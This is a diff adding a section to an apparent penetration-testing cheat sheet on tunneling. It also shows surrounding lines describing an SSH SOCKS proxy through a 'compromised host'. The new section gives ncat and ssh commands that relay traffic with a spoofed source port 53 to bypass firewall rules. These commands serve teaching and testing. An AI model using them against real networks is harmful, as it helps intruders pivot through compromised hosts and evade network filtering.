@@ -38,6 +38,15 @@ Local Port --> Compromised host (SSH) --> Wherever
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 
+### Port2HostPort (bypass source port firewall rule)
+
+```bash
+ncat -l 4444 --sh-exec "ncat 192.168.5.2 987 -p 53" &
+ssh -p 4444 user@192.168.5.2 
+```
+
+
+
 ### VPN-Tunnel
 
 You need **root in both devices** (as you are going to create new interfaces) and the sshd config has to allow root login:\
